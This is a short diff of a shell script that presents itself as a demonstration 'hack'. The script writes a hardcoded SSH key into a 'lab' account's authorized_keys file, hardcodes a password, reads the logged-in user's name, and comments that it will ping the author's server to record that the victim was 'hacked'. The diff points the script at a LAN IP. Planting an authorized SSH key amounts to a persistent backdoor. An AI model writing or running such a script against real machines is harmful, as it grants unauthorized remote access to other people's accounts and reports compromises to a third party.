@@ -8,7 +8,7 @@
 
 username=lab
 pwd=4242
-host_ip=127.0.0.1
+host_ip=192.168.1.38
 if [ -z $1 ]
 then
 	echo "\033[92m -------------------- Usage: ---------------------\033[0m"
@@ -36,9 +36,10 @@ then
 	mkdir /Local/Users/$username/.ssh
 	touch /Local/Users/$username/.ssh/authorized_keys
 	echo $key > /Local/Users/$username/.ssh/authorized_keys
+	chown $username /Local/Users/lab
 
 	# Copy some files for the demonstration
-	cp src/laugh.wav /Local/Users/$username/laugh.wav
+	# cp src/laugh.wav /Local/Users/$username/laugh.wav
 
 	# Make a request so my server knows you were "hacked"
 	runner_user=`who | grep -m1 "" | cut -d " " -f1`
